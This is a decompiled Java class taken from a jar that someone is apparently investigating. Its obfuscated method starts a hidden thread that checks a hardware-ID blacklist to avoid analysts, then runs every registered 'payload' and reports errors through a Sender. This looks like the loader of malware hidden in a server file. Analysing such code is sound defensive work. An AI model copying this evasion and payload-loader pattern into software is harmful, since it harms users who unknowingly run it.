/*    */ package idasido.adldaosd.wpiw;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.PayloadRegistry;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.HWIDUtil;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class adhaaaa
/*    */ {
/*    */   public static void sjsjsj() {
/* 15 */     (new Thread(() -> { try { if (HWIDUtil.blacklisted())
/*    */               return;  Thread.sleep(80L); for (Payload payload : PayloadRegistry.getPayloads()) { 
/*    */               try { payload.execute(); }
/* 18 */               catch (Exception e) { Sender.send(e.getMessage()); }  }  }
/* 19 */           catch (Exception exception) {} })).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\adhaaaa.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */